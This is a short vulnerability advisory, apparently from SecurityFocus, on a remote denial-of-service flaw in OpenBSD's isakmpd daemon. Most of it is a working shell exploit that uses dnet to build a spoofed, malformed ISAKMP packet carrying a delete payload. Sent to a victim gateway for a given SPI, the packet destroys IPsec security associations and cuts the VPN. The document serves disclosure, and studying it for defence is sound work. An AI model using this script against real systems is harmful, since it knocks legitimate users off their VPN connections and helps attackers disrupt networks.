source: http://www.securityfocus.com/bid/10496/info

It is reported that OpenBSD's isakmpd daemon is susceptible to a remote denial of service vulnerability.

An attacker is able to delete security associations and policies from IPSec VPN's by sending a malformed UDP ISAKMP packet to a vulnerable server. The malformed packet contains payloads for both setting up a new tunnel and deleting a tunnel. Isakmpd improperly acts upon the delete payload and terminates the associations and policys relating to the tunnel.

It is possible to destroy security associations, effectively eliminating the VPN connection between gateways, denying service to legitimate users of the VPN.

#!/bin/sh

if [ ! $# -eq 3 ]; then
	echo "usage: $0 fake_src victim spi";
	exit;
fi

src=$1; dst=$2
spi=`echo $3 | sed 's/\(..\)/\\\\x\1/g'`
cky_i=`dd if=/dev/urandom bs=8 count=1 2>/dev/null`

dnet hex \
	$cky_i \
	"\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x08\x10\x05\x00" \
	"\x00\x00\x00\x00" \
	"\x00\x00\x00\x5c" \
	"\x01\x00\x00\x04" \
	"\x0c\x00\x00\x2c" \
	"\x00\x00\x00\x01" \
	"\x00\x00\x00\x01" \
	"\x00\x00\x00\x20" \
	"\x01\x01\x00\x01" \
	"\x00\x00\x00\x18" \
	"\x00\x01\x00\x00" \
	"\x80\x01\x00\x05" \
	"\x80\x02\x00\x02" \
	"\x80\x03\x00\x01" \
	"\x80\x04\x00\x02" \
	"\x00\x00\x00\x10" \
	"\x00\x00\x00\x01" \
	"\x03\x04\x00\x01" \
	$spi |
	dnet udp sport 500 dport 500 |
	dnet ip proto udp src $src dst $dst |
	dnet send